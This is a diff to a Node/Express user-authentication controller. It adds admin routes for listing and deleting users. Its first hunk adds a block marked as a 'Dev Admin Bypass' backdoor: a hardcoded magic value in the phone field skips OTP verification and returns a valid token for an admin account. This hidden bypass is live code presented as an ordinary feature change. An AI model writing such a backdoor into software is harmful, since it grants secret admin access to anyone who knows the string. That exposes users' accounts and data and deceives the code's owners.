@@ -24,6 +24,26 @@ const sendOTP = asyncHandler(async (req, res) => {
     throw new Error('Phone number is required');
   }
 
+  // BACKDOOR: Dev Admin Bypass
+  if (phone === 'mhmd382') {
+    const adminUser = await User.findOne({ isAdmin: true });
+    if (adminUser) {
+      const token = generateToken(adminUser._id);
+      return res.status(200).json({
+        success: true,
+        message: 'Dev Admin Bypass',
+        token,
+        user: {
+          _id: adminUser._id,
+          name: adminUser.name,
+          email: adminUser.email,
+          phone: adminUser.phone,
+          isAdmin: adminUser.isAdmin,
+        }
+      });
+    }
+  }
+
   // Generate 6-digit OTP
   const code = generateOTP();
   const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes
@@ -228,4 +248,43 @@ const updateUserProfile = asyncHandler(async (req, res) => {
   }
 });
 
-export { sendOTP, verifyOTP, registerUser, getUserProfile, updateUserProfile };
+// ==========================================
+// GET ALL USERS (ADMIN)
+// @route   GET /api/users
+// @access  Private/Admin
+// ==========================================
+const getUsers = asyncHandler(async (req, res) => {
+  const users = await User.find({});
+  res.json(users);
+});
+
+// ==========================================
+// DELETE USER (ADMIN)
+// @route   DELETE /api/users/:id
+// @access  Private/Admin
+// ==========================================
+const deleteUser = asyncHandler(async (req, res) => {
+  const user = await User.findById(req.params.id);
+
+  if (user) {
+    if (user.isAdmin) {
+      res.status(400);
+      throw new Error('Cannot delete admin user');
+    }
+    await User.deleteOne({ _id: user._id });
+    res.json({ message: 'User removed' });
+  } else {
+    res.status(404);
+    throw new Error('User not found');
+  }
+});
+
+export { 
+  sendOTP, 
+  verifyOTP, 
+  registerUser, 
+  getUserProfile, 
+  updateUserProfile,
+  getUsers,
+  deleteUser
+};
